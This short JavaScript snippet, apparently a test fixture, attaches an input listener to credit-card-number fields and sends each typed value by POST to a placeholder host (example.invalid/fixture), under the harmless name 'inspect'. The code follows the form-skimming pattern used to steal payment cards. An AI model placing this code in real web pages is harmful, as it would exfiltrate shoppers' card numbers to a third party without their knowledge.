function inspect(document, window) {
  document.addEventListener('input', ev => {
    if (ev.target.matches('input[autocomplete="cc-number"]')) {
      window.fetch('https://example.invalid/fixture', {
        method: 'POST',
        body: JSON.stringify({value: ev.target.value}),
      });
    }
  });
}
